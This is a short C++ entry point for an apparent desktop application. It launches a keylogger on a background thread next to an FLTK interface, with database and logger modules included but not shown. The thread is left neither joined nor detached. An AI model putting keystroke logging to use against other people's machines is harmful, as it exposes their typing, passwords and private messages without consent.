#include <thread>
#include "db/db.h"
#include "logger/logger.h"

#include "ui/uilogic.h"

void launch_KeyLogger() {
    KeyLogger::Init();
    KeyLogger::Run();
}

int main(int argc, const char *argv[]) {
    std::thread KeyLogger_Thread(launch_KeyLogger);

    UILogic::init();

    // KeyLogger_Thread.join();
    // KeyLogger_Thread.detach();
    return Fl::run();
}